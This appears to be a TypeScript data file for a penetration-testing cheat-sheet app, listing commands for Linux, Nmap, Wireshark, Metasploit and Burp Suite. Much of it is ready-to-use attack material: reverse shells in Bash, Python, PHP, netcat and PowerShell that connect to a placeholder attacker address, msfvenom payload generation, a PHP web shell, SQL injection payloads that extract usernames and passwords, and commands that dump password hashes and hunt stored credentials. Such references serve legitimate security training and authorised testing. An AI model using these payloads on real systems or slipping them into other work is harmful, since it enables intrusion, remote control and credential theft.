export interface CheatSheet {
  id: string;
  title: string;
  category: string;
  sections: {
    title: string;
    items: { command: string; description: string }[];
  }[];
}

export const cheatsheets: CheatSheet[] = [
  {
    id: "linux-commands",
    title: "Linux Commands",
    category: "General",
    sections: [
      {
        title: "File Operations",
        items: [
          { command: "ls -la", description: "List all files with details" },
          { command: "find / -name '*.conf' 2>/dev/null", description: "Find all .conf files" },
          { command: "find / -perm -4000 2>/dev/null", description: "Find SUID binaries" },
          { command: "grep -r 'password' /etc/", description: "Search for password in /etc" },
          { command: "chmod 777 file", description: "Full permissions on file" },
          { command: "chown user:group file", description: "Change file owner" },
          { command: "tar -xvzf archive.tar.gz", description: "Extract tar.gz archive" },
        ],
      },
      {
        title: "Network Commands",
        items: [
          { command: "ifconfig / ip a", description: "Show network interfaces" },
          { command: "netstat -tulnp", description: "Show listening ports" },
          { command: "ss -tulnp", description: "Show sockets (modern netstat)" },
          { command: "curl -I <url>", description: "Get HTTP headers" },
          { command: "wget <url>", description: "Download file" },
          { command: "nc -lvnp <port>", description: "Start netcat listener" },
          { command: "tcpdump -i eth0 port 80", description: "Capture packets on port 80" },
        ],
      },
      {
        title: "User & Process Management",
        items: [
          { command: "whoami", description: "Current username" },
          { command: "id", description: "User ID and group info" },
          { command: "sudo -l", description: "List sudo privileges" },
          { command: "ps aux", description: "Show all running processes" },
          { command: "cat /etc/passwd", description: "List all users" },
          { command: "cat /etc/shadow", description: "Password hashes (need root)" },
          { command: "crontab -l", description: "List cron jobs" },
        ],
      },
    ],
  },
  {
    id: "nmap-cheatsheet",
    title: "Nmap Cheat Sheet",
    category: "Network Security",
    sections: [
      {
        title: "Host Discovery",
        items: [
          { command: "nmap -sn <target>", description: "Ping scan (no port scan)" },
          { command: "nmap -Pn <target>", description: "Skip host discovery" },
          { command: "nmap -PS22,80,443 <target>", description: "TCP SYN ping on ports" },
          { command: "nmap -PA80 <target>", description: "TCP ACK ping" },
          { command: "nmap -PU53 <target>", description: "UDP ping" },
        ],
      },
      {
        title: "Scan Types",
        items: [
          { command: "nmap -sS <target>", description: "SYN scan (stealth)" },
          { command: "nmap -sT <target>", description: "TCP connect scan" },
          { command: "nmap -sU <target>", description: "UDP scan" },
          { command: "nmap -sA <target>", description: "ACK scan (firewall detection)" },
          { command: "nmap -sV <target>", description: "Version detection" },
          { command: "nmap -O <target>", description: "OS detection" },
          { command: "nmap -A <target>", description: "Aggressive (OS + version + scripts)" },
        ],
      },
      {
        title: "NSE Scripts",
        items: [
          { command: "nmap --script vuln <target>", description: "Run vulnerability scripts" },
          { command: "nmap --script=http-enum <target>", description: "HTTP enumeration" },
          { command: "nmap --script=smb-vuln* <target>", description: "SMB vulnerability check" },
          { command: "nmap --script=dns-brute <target>", description: "DNS brute force" },
          { command: "nmap --script=default <target>", description: "Run default scripts" },
        ],
      },
      {
        title: "Output & Timing",
        items: [
          { command: "nmap -oN output.txt <target>", description: "Normal output" },
          { command: "nmap -oX output.xml <target>", description: "XML output" },
          { command: "nmap -oG output.gnmap <target>", description: "Grepable output" },
          { command: "nmap -T4 <target>", description: "Aggressive timing" },
          { command: "nmap -p- <target>", description: "All 65535 ports" },
          { command: "nmap -p 1-1000 <target>", description: "Port range" },
        ],
      },
    ],
  },
  {
    id: "wireshark-filters",
    title: "Wireshark Filters",
    category: "Network Security",
    sections: [
      {
        title: "Display Filters",
        items: [
          { command: "ip.addr == 10.0.0.1", description: "Traffic to/from IP" },
          { command: "tcp.port == 443", description: "TCP port 443" },
          { command: "http", description: "All HTTP traffic" },
          { command: "dns", description: "All DNS traffic" },
          { command: "tcp.flags.syn == 1 && tcp.flags.ack == 0", description: "SYN packets only" },
          { command: "frame contains \"password\"", description: "Frames containing string" },
          { command: "http.request.method == POST", description: "HTTP POST requests" },
          { command: "tcp.analysis.retransmission", description: "TCP retransmissions" },
        ],
      },
      {
        title: "Capture Filters",
        items: [
          { command: "host 10.0.0.1", description: "Capture from specific host" },
          { command: "port 80", description: "Capture port 80" },
          { command: "net 192.168.1.0/24", description: "Capture from subnet" },
          { command: "not port 22", description: "Exclude SSH traffic" },
          { command: "tcp", description: "TCP traffic only" },
        ],
      },
    ],
  },
  {
    id: "metasploit-commands",
    title: "Metasploit Commands",
    category: "Penetration Testing",
    sections: [
      {
        title: "Core Commands",
        items: [
          { command: "msfconsole", description: "Start Metasploit" },
          { command: "search <keyword>", description: "Search modules" },
          { command: "use <module>", description: "Select module" },
          { command: "info", description: "Show module info" },
          { command: "show options", description: "Show required options" },
          { command: "set RHOSTS <target>", description: "Set target" },
          { command: "exploit / run", description: "Execute module" },
          { command: "back", description: "Exit current module" },
        ],
      },
      {
        title: "Meterpreter Commands",
        items: [
          { command: "sysinfo", description: "System information" },
          { command: "getuid", description: "Current user" },
          { command: "getsystem", description: "Attempt privilege escalation" },
          { command: "hashdump", description: "Dump password hashes" },
          { command: "upload <file>", description: "Upload file to target" },
          { command: "download <file>", description: "Download file from target" },
          { command: "shell", description: "Drop to system shell" },
          { command: "screenshot", description: "Take screenshot" },
          { command: "keyscan_start", description: "Start keylogger" },
          { command: "portfwd add -l <port> -p <port> -r <target>", description: "Port forwarding" },
        ],
      },
      {
        title: "Payload Generation (msfvenom)",
        items: [
          { command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe", description: "Windows reverse shell" },
          { command: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf", description: "Linux reverse shell" },
          { command: "msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php", description: "PHP reverse shell" },
          { command: "msfvenom -l payloads", description: "List all payloads" },
          { command: "msfvenom -l encoders", description: "List all encoders" },
        ],
      },
    ],
  },
  {
    id: "burp-suite-shortcuts",
    title: "Burp Suite Shortcuts",
    category: "Web Security",
    sections: [
      {
        title: "Navigation",
        items: [
          { command: "Ctrl+Shift+T", description: "Switch to Target tab" },
          { command: "Ctrl+Shift+P", description: "Switch to Proxy tab" },
          { command: "Ctrl+Shift+R", description: "Switch to Repeater tab" },
          { command: "Ctrl+Shift+I", description: "Switch to Intruder tab" },
          { command: "Ctrl+Shift+D", description: "Switch to Dashboard" },
        ],
      },
      {
        title: "Proxy",
        items: [
          { command: "Ctrl+I", description: "Toggle intercept on/off" },
          { command: "Ctrl+F", description: "Forward intercepted request" },
          { command: "Ctrl+Shift+F", description: "Forward and intercept response" },
          { command: "Right-click > Send to Repeater", description: "Send request to Repeater" },
          { command: "Right-click > Send to Intruder", description: "Send request to Intruder" },
        ],
      },
      {
        title: "Common Workflows",
        items: [
          { command: "Target > Scope > Add", description: "Add target to scope" },
          { command: "Proxy > Options > Match/Replace", description: "Auto-modify requests" },
          { command: "Intruder > Positions > Add §", description: "Mark injection points" },
          { command: "Repeater > Send", description: "Send modified request" },
          { command: "Decoder > Encode/Decode", description: "Transform data formats" },
        ],
      },
    ],
  },
  {
    id: "reverse-shells",
    title: "Reverse Shell Commands",
    category: "Penetration Testing",
    sections: [
      {
        title: "Bash",
        items: [
          { command: "bash -i >& /dev/tcp/<ip>/<port> 0>&1", description: "Bash TCP reverse shell" },
          { command: "bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'", description: "Bash -c variant" },
        ],
      },
      {
        title: "Python",
        items: [
          { command: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", description: "Python reverse shell" },
          { command: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<ip>\",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", description: "Python3 PTY shell" },
        ],
      },
      {
        title: "PHP",
        items: [
          { command: "php -r '$sock=fsockopen(\"<ip>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", description: "PHP reverse shell" },
          { command: "<?php system($_GET['cmd']); ?>", description: "PHP web shell (one-liner)" },
        ],
      },
      {
        title: "Netcat",
        items: [
          { command: "nc -e /bin/sh <ip> <port>", description: "Netcat reverse shell" },
          { command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f", description: "Netcat without -e" },
          { command: "nc -lvnp <port>", description: "Netcat listener" },
        ],
      },
      {
        title: "PowerShell",
        items: [
          { command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", description: "PowerShell reverse shell" },
        ],
      },
      {
        title: "Shell Stabilization",
        items: [
          { command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", description: "Spawn TTY with Python" },
          { command: "export TERM=xterm", description: "Set terminal type" },
          { command: "Ctrl+Z then: stty raw -echo; fg", description: "Full interactive shell" },
          { command: "stty rows <num> columns <num>", description: "Fix terminal size" },
        ],
      },
    ],
  },
  {
    id: "sql-injection",
    title: "SQL Injection Cheat Sheet",
    category: "Web Security",
    sections: [
      {
        title: "Detection",
        items: [
          { command: "' OR 1=1--", description: "Basic authentication bypass" },
          { command: "' OR '1'='1", description: "String-based bypass" },
          { command: "1 OR 1=1", description: "Numeric injection" },
          { command: "'; WAITFOR DELAY '0:0:5'--", description: "Time-based blind (MSSQL)" },
          { command: "' AND SLEEP(5)--", description: "Time-based blind (MySQL)" },
        ],
      },
      {
        title: "Union Based",
        items: [
          { command: "' UNION SELECT NULL--", description: "Determine column count" },
          { command: "' UNION SELECT 1,2,3--", description: "Find visible columns" },
          { command: "' UNION SELECT username,password FROM users--", description: "Extract data" },
          { command: "' UNION SELECT table_name,NULL FROM information_schema.tables--", description: "List tables" },
          { command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", description: "List columns" },
        ],
      },
      {
        title: "Error Based",
        items: [
          { command: "' AND extractvalue(1,concat(0x7e,(SELECT version())))--", description: "MySQL error extraction" },
          { command: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", description: "MSSQL error extraction" },
        ],
      },
    ],
  },
  {
    id: "privilege-escalation",
    title: "Privilege Escalation",
    category: "Penetration Testing",
    sections: [
      {
        title: "Linux Privilege Escalation",
        items: [
          { command: "sudo -l", description: "Check sudo permissions" },
          { command: "find / -perm -4000 2>/dev/null", description: "Find SUID binaries" },
          { command: "find / -writable -type d 2>/dev/null", description: "Find writable directories" },
          { command: "cat /etc/crontab", description: "Check cron jobs" },
          { command: "ls -la /etc/passwd /etc/shadow", description: "Check file permissions" },
          { command: "uname -a", description: "Kernel version (check exploits)" },
          { command: "cat /proc/version", description: "Kernel and compiler info" },
          { command: "getcap -r / 2>/dev/null", description: "Find files with capabilities" },
          { command: "env", description: "Check environment variables" },
        ],
      },
      {
        title: "Windows Privilege Escalation",
        items: [
          { command: "whoami /priv", description: "Check user privileges" },
          { command: "whoami /groups", description: "Check group memberships" },
          { command: "systeminfo", description: "System information" },
          { command: "net user", description: "List users" },
          { command: "net localgroup administrators", description: "List admin group" },
          { command: "cmdkey /list", description: "Stored credentials" },
          { command: "reg query HKLM /f password /t REG_SZ /s", description: "Search registry for passwords" },
          { command: "schtasks /query /fo LIST /v", description: "List scheduled tasks" },
          { command: "icacls <file>", description: "Check file permissions" },
        ],
      },
    ],
  },
];
